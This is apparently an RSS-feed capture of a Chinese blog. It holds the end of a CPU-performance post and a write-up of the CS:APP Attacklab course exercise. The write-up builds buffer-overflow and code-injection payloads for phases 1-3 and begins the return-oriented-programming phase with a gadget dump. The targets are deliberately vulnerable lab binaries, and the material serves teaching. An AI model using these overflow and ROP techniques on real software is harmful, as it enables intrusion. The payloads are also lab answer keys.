&lt;h2&gt;分支预测&lt;/h2&gt;
&lt;p&gt;由于CPU的乱序执行,
CPU指令单元必须走在执行单元之前,但遇上分支,预测哪一个分支会被执行,然后CPU提前执行对应分支的代码.
如果结果证明预测正确,就继续(乱序执行);如果预测错误,只能舍弃并倒回去.&lt;/p&gt;
&lt;h1&gt;获得高性能&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;好的编译器优化&lt;/li&gt;
&lt;li&gt;注意避免隐秘的算法低效&lt;/li&gt;
&lt;li&gt;编写对编译器友好的代码:注意避免重复的过程调用和内存引用&lt;/li&gt;
&lt;li&gt;关注最深层循环&lt;/li&gt;
&lt;li&gt;利用指令级并行&lt;/li&gt;
&lt;li&gt;避免难以预测的分支&lt;/li&gt;
&lt;li&gt;充分利用缓存(局部性)&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 24 Jan 2025 00:00:00 GMT</pubDate></item><item><title>Attacklab</title><link>https://tankimzeg.top/blog/csapp/attacklab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/attacklab/</guid><description>Attacklab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/attacklab/&quot;&gt;https://tankimzeg.top/blog/csapp/attacklab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;介绍&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Phase 1~3: 利用栈溢出攻击&lt;/li&gt;
&lt;li&gt;Phase 4~5: 利用ROP攻击
ctarget 和 rtarget都用getbuf函数读取输入:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned getbuf(){
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Gets()&lt;/code&gt;函数是和 &lt;code&gt;gets()&lt;/code&gt;函数相似,不进行边界检查.这是溢出的利用点.&lt;/p&gt;
&lt;h2&gt;ROP举例&lt;/h2&gt;
&lt;p&gt;目的:pop赋值0xBBBBBBBB给%rbx,然后复制给%rax
gadgets:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;address1:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;	mov    %rbx,%rax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;address2:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;	pop    %rbx
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250124180130.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;工具&lt;/h1&gt;
&lt;h2&gt;objdump&lt;/h2&gt;
&lt;p&gt;这一次,我需要用到objdump工具.这是是Linux下的反汇编目标文件或者可执行文件的命令.
使用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install binutils
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装包含odjdump的工具&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d example.o &amp;gt; example.d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将目标文件反汇编成指令&lt;/p&gt;
&lt;h2&gt;hex2raw&lt;/h2&gt;
&lt;p&gt;将十六进制数转换成字符串,例如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* exploit.txt */
48 c7 c1 f0 11 40 00       /* mov $0x40011f0,%rcx */
68 ef cd ab 00             /* pushq $0xabcdef */ 
48 83 c0 11                /* add $0x11,%rax */ 
89 c2                      /* mov %eax,%edx */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以用I/O重定向存储转换后的文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; explot.txt &amp;gt; exploit-raw.txt
./ctarget &amp;lt; exploit-raw.txt
gdb ctarget
(gdb) r &amp;lt; exploit-raw.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;GDB&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c example.s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;产生汇编文件对应的目标文件.
当然,使用GDB的调试功能监视内存地址和寄存器也是必不可少的.我已经在Bomblab中掌握了.&lt;/p&gt;
&lt;h1&gt;ctarget:Code Injection Attacks&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;getbuf()&lt;/code&gt;函数被 &lt;code&gt;test()&lt;/code&gt;函数调用:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void test(){
	int val;
	val = getbuf();
	printf(&amp;quot;No exploit.  Getbuf return 0x%x\n&amp;quot;, val);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 1&lt;/h2&gt;
&lt;p&gt;这个问题中,需要我修改返回地址,重定向到&lt;code&gt;touch1()&lt;/code&gt;函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch1(){
	vlevel = 1;
	printf(&amp;quot;Touch1!: You called touch1()\n&amp;quot;);
	validate(1);
	exit(0);	
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先,我反汇编 &lt;code&gt;getbuf()&lt;/code&gt;函数:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disass getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 &amp;lt;+0&amp;gt;:     sub    $0x28,%rsp
   0x00000000004017ac &amp;lt;+4&amp;gt;:     mov    %rsp,%rdi
   0x00000000004017af &amp;lt;+7&amp;gt;:     call   0x401a40 &amp;lt;Gets&amp;gt;
   0x00000000004017b4 &amp;lt;+12&amp;gt;:    mov    $0x1,%eax
   0x00000000004017b9 &amp;lt;+17&amp;gt;:    add    $0x28,%rsp
   0x00000000004017bd &amp;lt;+21&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;非常简单,首先%rsp减去40字节,此时的%rsp作为buf指针传给 &lt;code&gt;Gets()&lt;/code&gt;函数,调用 &lt;code&gt;Gets()&lt;/code&gt;函数前返回地址设置为0x4017b4.
回顾[[机器级编程III(过程Procedure)#栈帧|栈帧]]的知识,如果我把返回地址覆写为&lt;code&gt;touch1()&lt;/code&gt;函数的地址,就能跳转到&lt;code&gt;touch1()&lt;/code&gt;函数.
寻找&lt;code&gt;touch1()&lt;/code&gt;函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disass touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00000000004017c4 &amp;lt;+4&amp;gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x00000000004017ce &amp;lt;+14&amp;gt;:    mov    $0x4030c5,%edi
   0x00000000004017d3 &amp;lt;+19&amp;gt;:    call   0x400cc0 &amp;lt;puts@plt&amp;gt;
   0x00000000004017d8 &amp;lt;+24&amp;gt;:    mov    $0x1,%edi
   0x00000000004017dd &amp;lt;+29&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x00000000004017e2 &amp;lt;+34&amp;gt;:    mov    $0x0,%edi
   0x00000000004017e7 &amp;lt;+39&amp;gt;:    call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;填充的字节应为:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase1 */
ff ff ff ff ff ff ff ff /* %rsp~%rsp+7 */
ff ff ff ff ff ff ff ff /* %rsp+8~%rsp+15 */
ff ff ff ff ff ff ff ff /* %rsp+16~%rsp+23 */
ff ff ff ff ff ff ff ff /* %rsp+24~%rsp+31 */
ff ff ff ff ff ff ff ff /* %rsp+32~%rsp+39 */
c0 17 40                /* 0x4017c0 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构造好后&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; Phase1 &amp;gt; Phase1-raw 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./ctarget -qi Phase1-raw
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 2&lt;/h2&gt;
&lt;p&gt;这个问题不仅需要跳转到 &lt;code&gt;touch2()&lt;/code&gt;函数,还需要修改%rdi寄存器的值传入我的cookie.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch2(unsigned val){
	vlevel = 2;
	if(val==cookie){
		printf(&amp;quot;Touch2!: You called touch2(0x%.8x)\n&amp;quot;, val);
		validate(2);
	}
	else {
		printf(&amp;quot;Misfire: You called touch2(0x%.8x)\n&amp;quot;, val);
		fail(2);
	}
	exit(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Handout提示我,这个问题需要注入代码.上课视频提到过本次lab没有使用栈随机化,这也是注入代码的前提.经过gdb调试,我发现在执行 &lt;code&gt;Gets()&lt;/code&gt;函数前%rsp总是等于0x5561dc78,验证了这一点.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250124224542.png&quot; alt=&quot;&quot;&gt;
来看 &lt;code&gt;touch2()&lt;/code&gt;函数汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble touch2
Dump of assembler code for function touch2:
   0x00000000004017ec &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00000000004017f0 &amp;lt;+4&amp;gt;:     mov    %edi,%edx
   0x00000000004017f2 &amp;lt;+6&amp;gt;:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x00000000004017fc &amp;lt;+16&amp;gt;:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
   0x0000000000401802 &amp;lt;+22&amp;gt;:    jne    0x401824 &amp;lt;touch2+56&amp;gt;
   0x0000000000401804 &amp;lt;+24&amp;gt;:    mov    $0x4030e8,%esi
   0x0000000000401809 &amp;lt;+29&amp;gt;:    mov    $0x1,%edi
   0x000000000040180e &amp;lt;+34&amp;gt;:    mov    $0x0,%eax
   0x0000000000401813 &amp;lt;+39&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401818 &amp;lt;+44&amp;gt;:    mov    $0x2,%edi
   0x000000000040181d &amp;lt;+49&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x0000000000401822 &amp;lt;+54&amp;gt;:    jmp    0x401842 &amp;lt;touch2+86&amp;gt;
   0x0000000000401824 &amp;lt;+56&amp;gt;:    mov    $0x403110,%esi
   0x0000000000401829 &amp;lt;+61&amp;gt;:    mov    $0x1,%edi
   0x000000000040182e &amp;lt;+66&amp;gt;:    mov    $0x0,%eax
   0x0000000000401833 &amp;lt;+71&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401838 &amp;lt;+76&amp;gt;:    mov    $0x2,%edi
   0x000000000040183d &amp;lt;+81&amp;gt;:    call   0x401d4f &amp;lt;fail&amp;gt;
   0x0000000000401842 &amp;lt;+86&amp;gt;:    mov    $0x0,%edi
   0x0000000000401847 &amp;lt;+91&amp;gt;:    call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构造注入的代码,首先需要覆写返回地址,使其跳转到我注入代码的地址处.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	mov    $0x59b997fa, %edi       # 传入参数:我的cookie
	mov    $0x4017ec,%r8
	call   *%r8                    # 跳转到touch2函数(不能用call 0x4017ec,会跳转到相对地址)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把这个代码保存为Phase2.s.
获取以上代码的机器指令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c Phase2.s
objdump -d Phase2.o &amp;gt; Phase2.d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看看Phase2.d的输出:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ cat Phase2.d
Phase2.o:     file format elf64-x86-64


Disassembly of section .text:

   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   49 c7 c0 ec 17 40 00    mov    $0x4017ec,%r8
   c:   41 ff d0                call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后把十六进制数输入Phase2文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase2 */
bf fa 97 b9 59          /* mov    $0x59b997fa,%edi */
49 c7 c0 ec 17 40 00    /* mov    $0x4017ec,%r8 */
41 ff d0                /* call   *%r8 */
/* 以上15字节 */
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff
78 dc 61 55             /* 返回地址覆写为0x5561dc78 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;生成字符串&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;mv Phase2.s Phase2.d Phase2.o
./hex2raw &amp;lt; Phase2 &amp;gt; Phase2-raw
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./ctarget -qi Phase2-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 49 C7 C0 EC 17 40 00 41 FF D0 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Phase 3&lt;/h2&gt;
&lt;p&gt;Phase2中我给%rdi寄存器赋值传参,而这个问题需要以字符指针传参.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void touch3(char *sval){
	vlevel = 3;
	if(hexmatch(cookie, sval)){
		printf(&amp;quot;Touch3!: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
		validate(3);
	}
	else{
		printf(&amp;quot;Misfire: You called touch3(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, sval);
		fail(3);
	}
	exit(0);
}

int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, &amp;quot;%.8x&amp;quot;, val);
	return strncmp(sval, s, 9) == 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看 &lt;code&gt;touch3()&lt;/code&gt;函数所在位置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble  touch3
Dump of assembler code for function touch3:
   0x00000000004018fa &amp;lt;+0&amp;gt;:     push   %rbx
   0x00000000004018fb &amp;lt;+1&amp;gt;:     mov    %rdi,%rbx
   0x00000000004018fe &amp;lt;+4&amp;gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x0000000000401908 &amp;lt;+14&amp;gt;:    mov    %rdi,%rsi
   0x000000000040190b &amp;lt;+17&amp;gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
   0x0000000000401911 &amp;lt;+23&amp;gt;:    call   0x40184c &amp;lt;hexmatch&amp;gt;
   0x0000000000401916 &amp;lt;+28&amp;gt;:    test   %eax,%eax
   0x0000000000401918 &amp;lt;+30&amp;gt;:    je     0x40193d &amp;lt;touch3+67&amp;gt;
   0x000000000040191a &amp;lt;+32&amp;gt;:    mov    %rbx,%rdx
   0x000000000040191d &amp;lt;+35&amp;gt;:    mov    $0x403138,%esi
   0x0000000000401922 &amp;lt;+40&amp;gt;:    mov    $0x1,%edi
   0x0000000000401927 &amp;lt;+45&amp;gt;:    mov    $0x0,%eax
   0x000000000040192c &amp;lt;+50&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401931 &amp;lt;+55&amp;gt;:    mov    $0x3,%edi
   0x0000000000401936 &amp;lt;+60&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x000000000040193b &amp;lt;+65&amp;gt;:    jmp    0x40195e &amp;lt;touch3+100&amp;gt;
   0x000000000040193d &amp;lt;+67&amp;gt;:    mov    %rbx,%rdx
   0x0000000000401940 &amp;lt;+70&amp;gt;:    mov    $0x403160,%esi
   0x0000000000401945 &amp;lt;+75&amp;gt;:    mov    $0x1,%edi
   0x000000000040194a &amp;lt;+80&amp;gt;:    mov    $0x0,%eax
   0x000000000040194f &amp;lt;+85&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401954 &amp;lt;+90&amp;gt;:    mov    $0x3,%edi
   0x0000000000401959 &amp;lt;+95&amp;gt;:    call   0x401d4f &amp;lt;fail&amp;gt;
   0x000000000040195e &amp;lt;+100&amp;gt;:   mov    $0x0,%edi
   0x0000000000401963 &amp;lt;+105&amp;gt;:   call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不妨以栈顶指针为sval,构造注入代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Phase3:
	mov    $0x5561dc78, %rdi
	mov    $0x4018fa,%r8
	sub    $0x28,%rsp
	call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟Phase2的操作一样,查看机器指令:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;Phase3&amp;gt;:
   0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi
   7:   49 c7 c0 fa 18 40 00    mov    $0x4018fa,%r8
   e:   48 83 ec 28             sub    $0x28,%rsp
  12:   41 ff d0                call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构造注入代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase3 */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
48 c7 c7 78 dc 61 55                /* mov    $0x5561dc78,%rdi */
49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */
48 83 ec 30                         /* sub    $0x30,%rsp */
41 ff d0                            /* call   *%r8 */
/* 以上共30字节 */
ff ff ff ff ff ff ff ff ff ff 
81 dc 61 55 /* 返回地址覆写为0x5561dc81  %rsp+9 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;故技重施就成功了!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./ctarget -qi Phase3-raw
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 48 C7 C7 78 DC 61 55 49 C7 C0 FA 18 40 00 48 83 EC 30 41 FF D0 FF FF FF FF FF FF FF FF FF FF 81 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我踩了一个坑.一开始我没有 &lt;code&gt;sub    $0x30,%rsp&lt;/code&gt; 导致cookie字符串被覆写了,因为执行返回地址前栈底指针向上移动40字节,加上返回地址似乎pop了,所以栈底指针其实在0x5561dc78+0x28+0x8处.为了避免覆写我的cookie,应先将栈底指针减去48字节再调用 &lt;code&gt;call touch3&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;rtaget:Return-Oriented Programming&lt;/h1&gt;
&lt;p&gt;为了应对以上ctarget的攻击方式,操作系统采用了栈随机化技术和将栈内存标记为不可执行.虽然不能自己注入代码了,但是现有的代码是可以执行的.这就是面向返回的编程(ROP).
ROP的策略是在现有程序的字节序列中抽取指令(以 &lt;code&gt;0xc3   /* ret */&lt;/code&gt;结尾),被称为gadget.
farm.c文件为我提供了这些可用的指令集,称为gadget farm.在rtarget中,gadget farm以 &lt;code&gt;start_farm&lt;/code&gt;函数起始,以 &lt;code&gt;end_farm&lt;/code&gt;函数结尾.我在gdb中,首先分别找到了这两个函数所在的地址:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble start_farm
Dump of assembler code for function start_farm:
   0x0000000000401994 &amp;lt;+0&amp;gt;:     mov    $0x1,%eax
   0x0000000000401999 &amp;lt;+5&amp;gt;:     ret
End of assembler dump.
(gdb) disass end_farm
Dump of assembler code for function end_farm:
   0x0000000000401ab2 &amp;lt;+0&amp;gt;:     mov    $0x1,%eax
   0x0000000000401ab7 &amp;lt;+5&amp;gt;:     ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后显示这两个地址之间内存的字节&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disass /r 0x401994,0x401ab7
Dump of assembler code from 0x401994 to 0x401ab7:
   0x0000000000401994 &amp;lt;start_farm+0&amp;gt;:   b8 01 00 00 00          mov    $0x1,%eax
   0x0000000000401999 &amp;lt;start_farm+5&amp;gt;:   c3                      ret
   0x000000000040199a &amp;lt;getval_142+0&amp;gt;:   b8 fb 78 90 90          mov    $0x909078fb,%eax
   0x000000000040199f &amp;lt;getval_142+5&amp;gt;:   c3                      ret
   0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
   0x00000000004019a6 &amp;lt;addval_273+6&amp;gt;:   c3                      ret
   0x00000000004019a7 &amp;lt;addval_219+0&amp;gt;:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
   0x00000000004019ad &amp;lt;addval_219+6&amp;gt;:   c3                      ret
   0x00000000004019ae &amp;lt;setval_237+0&amp;gt;:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
   0x00000000004019b4 &amp;lt;setval_237+6&amp;gt;:   c3                      ret
   0x00000000004019b5 &amp;lt;setval_424+0&amp;gt;:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
   0x00000000004019bb &amp;lt;setval_424+6&amp;gt;:   c3                      ret
   0x00000000004019bc &amp;lt;setval_470+0&amp;gt;:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
   0x00000000004019c2 &amp;lt;setval_470+6&amp;gt;:   c3                      ret
   0x00000000004019c3 &amp;lt;setval_426+0&amp;gt;:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
   0x00000000004019c9 &amp;lt;setval_426+6&amp;gt;:   c3                      ret
   0x00000000004019ca &amp;lt;getval_280+0&amp;gt;:   b8 29 58 90 c3          mov    $0xc3905829,%eax
   0x00000000004019cf &amp;lt;getval_280+5&amp;gt;:   c3                      ret
   0x00000000004019d0 &amp;lt;mid_farm+0&amp;gt;:     b8 01 00 00 00          mov    $0x1,%eax
   0x00000000004019d5 &amp;lt;mid_farm+5&amp;gt;:     c3                      ret
   0x00000000004019d6 &amp;lt;add_xy+0&amp;gt;:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
   0x00000000004019da &amp;lt;add_xy+4&amp;gt;:       c3                      ret
   0x00000000004019db &amp;lt;getval_481+0&amp;gt;:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
   0x00000000004019e0 &amp;lt;getval_481+5&amp;gt;:   c3                      ret
   0x00000000004019e1 &amp;lt;setval_296+0&amp;gt;:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)
   0x00000000004019e7 &amp;lt;setval_296+6&amp;gt;:   c3                      ret
   0x00000000004019e8 &amp;lt;addval_113+0&amp;gt;:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
   0x00000000004019ee &amp;lt;addval_113+6&amp;gt;:   c3                      ret
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00000000004019ef &amp;lt;addval_490+0&amp;gt;:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax
   0x00000000004019f5 &amp;lt;addval_490+6&amp;gt;:   c3                      ret
   0x00000000004019f6 &amp;lt;getval_226+0&amp;gt;:   b8 89 d1 48 c0          mov    $0xc048d189,%eax
   0x00000000004019fb &amp;lt;getval_226+5&amp;gt;:   c3                      ret
   0x00000000004019fc &amp;lt;setval_384+0&amp;gt;:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)
   0x0000000000401a02 &amp;lt;setval_384+6&amp;gt;:   c3                      ret
   0x0000000000401a03 &amp;lt;addval_190+0&amp;gt;:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
   0x0000000000401a09 &amp;lt;addval_190+6&amp;gt;:   c3                      ret
   0x0000000000401a0a &amp;lt;setval_276+0&amp;gt;:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)
   0x0000000000401a10 &amp;lt;setval_276+6&amp;gt;:   c3                      ret
   0x0000000000401a11 &amp;lt;addval_436+0&amp;gt;:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
   0x0000000000401a17 &amp;lt;addval_436+6&amp;gt;:   c3                      ret
   0x0000000000401a18 &amp;lt;getval_345+0&amp;gt;:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax
   0x0000000000401a1d &amp;lt;getval_345+5&amp;gt;:   c3                      ret
   0x0000000000401a1e &amp;lt;addval_479+0&amp;gt;:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax
   0x0000000000401a24 &amp;lt;addval_479+6&amp;gt;:   c3                      ret
   0x0000000000401a25 &amp;lt;addval_187+0&amp;gt;:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
   0x0000000000401a2b &amp;lt;addval_187+6&amp;gt;:   c3                      ret
   0x0000000000401a2c &amp;lt;setval_248+0&amp;gt;:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)
   0x0000000000401a32 &amp;lt;setval_248+6&amp;gt;:   c3                      ret
   0x0000000000401a33 &amp;lt;getval_159+0&amp;gt;:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
   0x0000000000401a38 &amp;lt;getval_159+5&amp;gt;:   c3                      ret
   0x0000000000401a39 &amp;lt;addval_110+0&amp;gt;:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
   0x0000000000401a3f &amp;lt;addval_110+6&amp;gt;:   c3                      ret
   0x0000000000401a40 &amp;lt;addval_487+0&amp;gt;:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
   0x0000000000401a46 &amp;lt;addval_487+6&amp;gt;:   c3                      ret
   0x0000000000401a47 &amp;lt;addval_201+0&amp;gt;:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
   0x0000000000401a4d &amp;lt;addval_201+6&amp;gt;:   c3                      ret
   0x0000000000401a4e &amp;lt;getval_272+0&amp;gt;:   b8 99 d1 08 d2          mov    $0xd208d199,%eax
   0x0000000000401a53 &amp;lt;getval_272+5&amp;gt;:   c3                      ret
   0x0000000000401a54 &amp;lt;getval_155+0&amp;gt;:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax
   0x0000000000401a59 &amp;lt;getval_155+5&amp;gt;:   c3                      ret
   0x0000000000401a5a &amp;lt;setval_299+0&amp;gt;:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
   0x0000000000401a60 &amp;lt;setval_299+6&amp;gt;:   c3                      ret
   0x0000000000401a61 &amp;lt;addval_404+0&amp;gt;:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax
   0x0000000000401a67 &amp;lt;addval_404+6&amp;gt;:   c3                      ret
   0x0000000000401a68 &amp;lt;getval_311+0&amp;gt;:   b8 89 d1 08 db          mov    $0xdb08d189,%eax
   0x0000000000401a6d &amp;lt;getval_311+5&amp;gt;:   c3                      ret
   0x0000000000401a6e &amp;lt;setval_167+0&amp;gt;:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
   0x0000000000401a74 &amp;lt;setval_167+6&amp;gt;:   c3                      ret
   0x0000000000401a75 &amp;lt;setval_328+0&amp;gt;:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)
   0x0000000000401a7b &amp;lt;setval_328+6&amp;gt;:   c3                      ret
